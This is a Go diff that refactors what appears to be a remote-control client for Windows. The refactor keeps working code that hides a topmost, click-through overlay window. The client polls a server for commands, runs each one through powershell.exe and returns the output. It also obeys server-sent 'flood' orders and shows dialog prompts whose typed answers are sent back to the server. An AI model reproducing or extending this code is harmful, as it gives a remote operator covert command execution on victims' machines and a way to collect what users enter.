@@ -81,22 +81,7 @@ func main() {
 
 	mode := glfw.GetPrimaryMonitor().GetVideoMode()
 
-	glfw.WindowHint(glfw.Resizable, glfw.True)
-	glfw.WindowHint(glfw.ContextVersionMajor, 3)
-	glfw.WindowHint(glfw.ContextVersionMinor, 2)
-	glfw.WindowHint(glfw.OpenGLProfile, glfw.OpenGLCoreProfile)
-	glfw.WindowHint(glfw.OpenGLForwardCompatible, glfw.True)
-
-	glfw.WindowHint(glfw.RedBits, mode.RedBits)
-	glfw.WindowHint(glfw.GreenBits, mode.GreenBits)
-	glfw.WindowHint(glfw.BlueBits, mode.BlueBits)
-	glfw.WindowHint(glfw.RefreshRate, mode.RefreshRate)
-
-	glfw.WindowHint(glfw.TransparentFramebuffer, glfw.True)
-	glfw.WindowHint(glfw.AutoIconify, glfw.False)
-	glfw.WindowHint(glfw.Floating, glfw.True)
-	glfw.WindowHint(glfw.Visible, glfw.False)
-
+	SetWindowFlags(mode)
 	window, err := glfw.CreateWindow(mode.Width, mode.Height, "", nil, nil)
 	if err != nil {
 		panic(err)
@@ -107,6 +92,8 @@ func main() {
 
 	window.SetAttrib(glfw.Resizable, glfw.False)
 	window.SetAttrib(glfw.Decorated, glfw.False)
+
+	SetWindowAttributes(window)
 
 	go func() {
 		hk := hotkey.New([]hotkey.Modifier{hotkey.ModCtrl, hotkey.ModAlt, hotkey.ModShift}, hotkey.KeyX)
@@ -135,18 +122,15 @@ func main() {
 		log.Panicf("LoadFont: %v", err)
 	}
 
-	hwnd := window.GetWin32Window()
-	window.Show()
+	WindowLoop(window, font, pid, mode, ctx, receiver, c)
 
-	syscall.SyscallN(SetWindowPos, uintptr(unsafe.Pointer(hwnd)), uintptr(HWND_TOPMOST), 0, 0, 0, 0, uintptr(TOPMOST_FLAGS))
+	receiver.CloseSend()
+	window.Destroy()
+	cancel()
+}
 
-	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(SW_HIDE))
-	syscall.SyscallN(SetWindowLongPtrW, uintptr(unsafe.Pointer(hwnd)), uintptr(GWL_EXSTYLE), uintptr(WS_EX_TOOLWINDOW|WS_EX_TRANSPARENT|WS_EX_LAYERED))
-	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(syscall.SW_SHOW))
-
-	window.SetOpacity(0.9)
-	window.SetCloseCallback(CloseCallback)
-
+func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.VidMode,
+	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient) {
 	lastFrameTime := 0.0
 	fpslimit := 1.0 / 100.0
 
@@ -163,7 +147,7 @@ func main() {
 			lastFrameTime = now
 
 			go func() {
-				d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
+				d, err := client.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
 
 				if err != nil {
 					log.Println("Error during GetCommand:", err)
@@ -172,7 +156,7 @@ func main() {
 				var out []byte
 				if d.GetShouldExec() {
 					out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
-					c.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+					client.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
 					if err != nil {
 						log.Println("Error during exec", err)
 					}
@@ -180,7 +164,7 @@ func main() {
 			}()
 
 			go func() {
-				flood, _ := c.GetFlood(ctx, &pb.Void{})
+				flood, _ := client.GetFlood(ctx, &pb.Void{})
 
 				if flood.GetShouldFlood() {
 					switch flood.FloodType {
@@ -200,7 +184,7 @@ func main() {
 			}()
 
 			go func() {
-				dialog, _ := c.GetDialog(ctx, &pb.ClientDataRequest{ClientId: pid})
+				dialog, _ := client.GetDialog(ctx, &pb.ClientDataRequest{ClientId: pid})
 
 				if dialog.GetShouldShowDialog() {
 					var text string = ""
@@ -209,7 +193,7 @@ func main() {
 						text, err = zenity.Entry(dialog.GetDialogPrompt(), zenity.Title(dialog.GetDialogTitle()))
 					}
 
-					c.SetDialogOutput(ctx, &pb.DialogOutput{
+					client.SetDialogOutput(ctx, &pb.DialogOutput{
 						EntryText: text,
 						Id: &pb.ClientDataRequest{
 							ClientId: pid}})
@@ -221,10 +205,39 @@ func main() {
 		}
 
 	}
+}
 
-	receiver.CloseSend()
-	window.Destroy()
-	cancel()
+func SetWindowAttributes(window *glfw.Window) {
+	hwnd := window.GetWin32Window()
+	window.Show()
+
+	syscall.SyscallN(SetWindowPos, uintptr(unsafe.Pointer(hwnd)), uintptr(HWND_TOPMOST), 0, 0, 0, 0, uintptr(TOPMOST_FLAGS))
+
+	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(SW_HIDE))
+	syscall.SyscallN(SetWindowLongPtrW, uintptr(unsafe.Pointer(hwnd)), uintptr(GWL_EXSTYLE), uintptr(WS_EX_TOOLWINDOW|WS_EX_TRANSPARENT|WS_EX_LAYERED))
+	syscall.SyscallN(ShowWindow, uintptr(unsafe.Pointer(hwnd)), uintptr(syscall.SW_SHOW))
+
+	window.SetOpacity(0.9)
+
+	window.SetCloseCallback(CloseCallback)
+}
+
+func SetWindowFlags(mode *glfw.VidMode) {
+	glfw.WindowHint(glfw.Resizable, glfw.True)
+	glfw.WindowHint(glfw.ContextVersionMajor, 3)
+	glfw.WindowHint(glfw.ContextVersionMinor, 2)
+	glfw.WindowHint(glfw.OpenGLProfile, glfw.OpenGLCoreProfile)
+	glfw.WindowHint(glfw.OpenGLForwardCompatible, glfw.True)
+
+	glfw.WindowHint(glfw.RedBits, mode.RedBits)
+	glfw.WindowHint(glfw.GreenBits, mode.GreenBits)
+	glfw.WindowHint(glfw.BlueBits, mode.BlueBits)
+	glfw.WindowHint(glfw.RefreshRate, mode.RefreshRate)
+
+	glfw.WindowHint(glfw.TransparentFramebuffer, glfw.True)
+	glfw.WindowHint(glfw.AutoIconify, glfw.False)
+	glfw.WindowHint(glfw.Floating, glfw.True)
+	glfw.WindowHint(glfw.Visible, glfw.False)
 }
 
 func GetOnScreenText(receiver pb.Consumer_SubscribeOnScreenTextClient, pid string) (string, bool, error) {
